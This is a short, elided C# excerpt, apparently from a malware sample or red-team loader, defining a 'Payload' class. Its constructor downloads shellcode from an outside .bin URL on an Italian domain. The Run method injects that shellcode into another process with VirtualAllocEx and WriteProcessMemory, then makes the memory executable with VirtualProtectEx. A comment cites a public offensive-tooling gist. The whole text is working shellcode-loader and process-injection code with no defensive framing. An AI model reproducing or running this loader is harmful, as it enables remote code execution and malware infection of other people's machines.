...
public class Payload
{
    public Payload()
    {
        var dhu = GetShellcode("https://fattifattituoi.it/ahaytwixnagxkdyaal101836.bin");
        Run(dhu);
    }
...
//https://gist.github.com/rvrsh3ll/ece9cb8160b161c908b53f4a52511517
    ...
    public static void Run(byte[] dhu)
    {
        ...
        IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, dhu.Length, MEM_COMMIT, PAGE_READWRITE);
        IntPtr bytesWritten = IntPtr.Zero;
        bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, dhu, dhu.Length, out bytesWritten);
        ...
        resultBool = VirtualProtectEx(pi.hProcess, resultPtr, dhu.Length, PAGE_EXECUTE_READ, out oldProtect);
